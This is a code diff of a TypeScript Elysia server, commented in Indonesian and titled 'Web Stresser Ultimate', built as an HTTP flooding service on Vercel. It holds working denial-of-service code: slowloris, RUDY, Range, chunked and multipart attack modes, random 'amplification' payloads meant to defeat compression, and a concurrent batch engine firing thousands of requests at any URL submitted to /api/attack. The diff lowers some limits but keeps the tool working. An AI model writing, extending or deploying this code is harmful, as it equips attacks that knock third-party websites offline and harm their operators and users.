@@ -1,14 +1,15 @@
 import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
 
-// Konfigurasi koneksi pool (gunakan IP server Vercel / AWS)
+// Koneksi pool untuk efisiensi
 const globalAgent = new Agent({
-  connections: 200,
+  connections: 100,
   pipelining: 1,
   keepAliveTimeout: 60000,
 });
 setGlobalDispatcher(globalAgent);
 
+// Hitung user aktif
 const activeUsers = new Map<string, number>();
 setInterval(() => {
   const now = Date.now();
@@ -17,7 +18,7 @@ setInterval(() => {
   }
 }, 30000);
 
-// Helper untuk payload random (amplifikasi)
+// Helper untuk payload amplification
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -29,14 +30,10 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   if (kb <= 0) return '';
   const size = kb * 1024;
   if (ampType === 'range') return '';
-  // Payload acak untuk menghindari kompresi
-  const chunk = randomString(1024);
-  const repeat = Math.floor(size / chunk.length);
-  const remainder = size % chunk.length;
-  return chunk.repeat(repeat) + chunk.slice(0, remainder);
+  return randomString(size);
 }
 
-// Single attack dengan berbagai metode
+// Serangan single (dipanggil oleh frontend untuk setiap request)
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -46,7 +43,7 @@ interface SingleAttackParams {
   retryCount: number;
   randomDelay: number;
   keepAlive: boolean;
-  attackType: string; // normal, slowloris, rudy, range, chunked, multipart
+  attackType: string;
   amplifyKB: number;
   amplifyEnabled: boolean;
   amplifyType: string;
@@ -72,7 +69,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
     ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
   }
 
-  // Terapkan metode attack
+  // Modifikasi berdasarkan attack type
   switch (attackType) {
     case 'range':
       finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
@@ -98,18 +95,18 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
       else finalBody = body;
       useBody = true;
       break;
-    default: // normal flood
+    default:
       if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
       else finalBody = body;
       useBody = true;
   }
 
-  // Penanganan khusus jika method GET/HEAD dengan amplifikasi besar
+  // Jika amplification dan method GET/HEAD besar, ubah ke POST
   if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
     finalMethod = 'POST';
     useBody = true;
     finalBody = ampPayload;
-  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD')) {
+  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length <= 2048) {
     const separator = finalUrl.includes('?') ? '&' : '?';
     finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
     useBody = false;
@@ -173,7 +170,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
-// Batch attack (massive)
+// Serangan batch (backend concurrency)
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -189,15 +186,13 @@ interface BatchAttackParams {
   amplifyType: string;
   concurrency: number;
   total: number;
-  continuous: boolean;
-  intervalMs: number;
 }
 
 async function batchAttack(params: BatchAttackParams): Promise<any> {
   const {
     url, method, headers, body, timeout, retryCount, randomDelay,
     keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
-    concurrency, total, continuous, intervalMs
+    concurrency, total,
   } = params;
 
   const startTime = Date.now();
@@ -205,48 +200,33 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
   let totalFail = 0;
   let totalBytes = 0;
   let allLatencies: number[] = [];
-  let loopCount = 0;
 
-  const runBatch = async (targetTotal: number): Promise<{ success: number; fail: number; bytes: number; latencies: number[] }> => {
-    let successCount = 0;
-    let failCount = 0;
-    let bytes = 0;
-    let latencies: number[] = [];
-
-    const runOne = async () => {
-      const result = await singleAttack({
-        url, method, headers, body, timeout: Math.min(timeout, 9000), retryCount, randomDelay,
-        keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType
-      });
-      if (result.success) successCount++;
-      else failCount++;
-      bytes += result.responseSize;
-      latencies.push(result.durationMs);
-    };
-
-    let index = 0;
-    const workers: Promise<void>[] = [];
-    const actualConcurrency = Math.min(concurrency, 100); // batasi untuk Vercel
-    for (let i = 0; i < actualConcurrency; i++) {
-      workers.push(new Promise<void>(async (resolve) => {
-        while (index < targetTotal) {
-          index++;
-          await runOne();
-        }
-        resolve();
-      }));
-    }
-    await Promise.all(workers);
-    return { success: successCount, fail: failCount, bytes, latencies };
+  const runOne = async () => {
+    const result = await singleAttack({
+      url, method, headers, body, timeout: Math.min(timeout, 9000), retryCount, randomDelay,
+      keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
+    });
+    if (result.success) totalSuccess++;
+    else totalFail++;
+    totalBytes += result.responseSize;
+    allLatencies.push(result.durationMs);
   };
 
   const actualTotal = Math.min(total, 5000);
-  const batchResult = await runBatch(actualTotal);
-  totalSuccess += batchResult.success;
-  totalFail += batchResult.fail;
-  totalBytes += batchResult.bytes;
-  allLatencies.push(...batchResult.latencies);
-  loopCount++;
+  const actualConcurrency = Math.min(concurrency, 50);
+  const workers: Promise<void>[] = [];
+  let index = 0;
+
+  for (let i = 0; i < actualConcurrency; i++) {
+    workers.push(new Promise<void>(async (resolve) => {
+      while (index < actualTotal) {
+        index++;
+        await runOne();
+      }
+      resolve();
+    }));
+  }
+  await Promise.all(workers);
 
   const totalTime = Date.now() - startTime;
   const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
@@ -261,7 +241,6 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     totalTimeMs: totalTime,
     avgLatencyMs: avgLatency,
     rps,
-    loopCount,
     latencies: allLatencies.slice(0, 100),
   };
 }
@@ -276,8 +255,8 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Elysia on Vercel (AWS IP)',
-    version: '2.0.0',
+    message: 'Web Stresser Ultimate - Elysia on Vercel (AWS Region)',
+    version: '3.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
@@ -325,8 +304,6 @@ export const app = new Elysia()
       amplifyType: t.String(),
       concurrency: t.Number(),
       total: t.Number(),
-      continuous: t.Boolean(),
-      intervalMs: t.Number(),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
